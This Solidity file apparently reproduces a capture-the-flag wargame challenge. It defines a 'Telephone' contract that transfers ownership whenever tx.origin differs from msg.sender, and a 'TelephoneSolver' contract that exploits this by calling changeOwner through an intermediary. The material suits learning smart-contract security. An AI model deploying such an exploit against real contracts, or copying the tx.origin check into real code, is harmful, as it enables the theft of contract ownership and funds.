// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }

    function testTxOrigin() public view returns (address) {
        return tx.origin;
    }

    function testMsgSender() public view returns (address) {
        return msg.sender;
    }
}

contract TelephoneSolver {
    Telephone public phoneContract;

    function setContractAddress(address _address) public {
        phoneContract = Telephone(_address);
    }

    function claimPhoneOwner() public {
        phoneContract.changeOwner(msg.sender);
    }

    function reviewTxOrigin() public view returns (address) {
        return phoneContract.testTxOrigin();
    }

    function reviewMsgSender() public view returns (address) {
        return phoneContract.testMsgSender();
    }
}
